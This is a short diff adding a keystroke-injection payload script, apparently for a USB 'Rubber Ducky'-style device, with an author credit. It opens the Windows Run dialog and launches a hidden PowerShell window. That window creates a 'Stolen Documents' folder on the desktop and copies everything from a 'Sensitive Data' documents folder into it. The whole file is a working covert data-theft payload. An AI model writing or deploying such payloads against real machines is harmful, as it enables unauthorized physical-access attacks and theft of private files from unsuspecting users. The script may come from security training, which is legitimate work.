@@ -1,0 +1,8 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden -command "mkdir \"$Env:USERPROFILE\Desktop\Stolen Documents\"; xcopy \"$Env:USERPROFILE\Documents\ZTW Documents\Sensitive Data\*\" \"$Env:USERPROFILE\Desktop\Stolen Documents\" /E /I /Y"
+DELAY 1000
+ENTER
